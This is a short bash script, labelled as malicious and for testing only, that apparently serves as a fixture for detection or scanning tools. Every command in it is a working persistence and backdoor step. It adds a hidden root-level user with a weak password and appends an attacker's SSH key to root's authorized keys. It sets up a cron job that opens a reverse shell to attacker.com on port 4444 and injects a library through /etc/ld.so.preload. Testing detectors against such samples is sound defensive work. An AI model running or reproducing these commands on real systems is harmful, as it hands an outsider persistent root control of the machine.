#!/usr/bin/env bash
# MALICIOUS SCRIPT - FOR TESTING PURPOSES ONLY
# Simulates rootkit installation - creates hidden backdoor access

echo "Installing rootkit..."

# Create hidden user with root privileges
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "..." 2>/dev/null
echo "...:password123" | chpasswd

# Hide from /etc/passwd by prepending with spaces
sed -i 's/^\.\.\./   .../' /etc/passwd

# Install SSH backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Create persistent reverse shell via cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Modify ld.so.preload for library injection
echo "/tmp/.hidden/libevil.so" >> /etc/ld.so.preload

echo "Rootkit installed successfully"
